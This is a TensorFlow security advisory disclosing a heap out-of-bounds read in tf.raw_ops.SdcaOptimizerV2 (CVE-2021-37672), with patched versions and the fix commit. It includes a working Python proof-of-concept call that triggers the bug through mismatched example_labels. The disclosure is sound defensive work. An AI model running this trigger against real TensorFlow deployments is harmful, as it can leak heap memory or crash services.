# Heap OOB in `SdcaOptimizerV2`

Moderate

[mihaimaruseac](/mihaimaruseac)
published
GHSA-5hj3-vjjf-f5m7
Aug 11, 2021

## Package

pip

tensorflow, tensorflow-cpu, tensorflow-gpu
([pip](/advisories?query=ecosystem%3Apip))

## Affected versions

< 2.6.0

## Patched versions

2.3.4, 2.4.3, 2.5.1

## Description

### Impact

An attacker can read from outside of bounds of heap allocated data by sending specially crafted illegal arguments to `tf.raw_ops.SdcaOptimizerV2`:

```
import tensorflow as tf

tf.raw_ops.SdcaOptimizerV2(
  sparse_example_indices=[[1]],
  sparse_feature_indices=[[1]],
  sparse_feature_values=[[1.0,2.0]],
  dense_features=[[1.0]],
  example_weights=[1.0],
  example_labels=[],
  sparse_indices=[1],
  sparse_weights=[1.0],
  dense_weights=[[1.0]],
  example_state_data=[[100.0,100.0,100.0,100.0]],
  loss_type='logistic_loss',
  l1=100.0,
  l2=100.0,
  num_loss_partitions=1,
  num_inner_iterations=1,
  adaptive=True)
```

The [implementation](https://github.com/tensorflow/tensorflow/blob/460e000de3a83278fb00b61a16d161b1964f15f4/tensorflow/core/kernels/sdca_internal.cc#L320-L353) does not check that the length of `example_labels` is the same as the number of examples.

### Patches

We have patched the issue in GitHub commit [a4e138660270e7599793fa438cd7b2fc2ce215a6](https://github.com/tensorflow/tensorflow/commit/a4e138660270e7599793fa438cd7b2fc2ce215a6).

The fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.

### For more information

Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution

This vulnerability has been reported by members of the Aivul Team from Qihoo 360.

### Severity

Moderate

### CVE ID

CVE-2021-37672

### Weaknesses

No CWEs
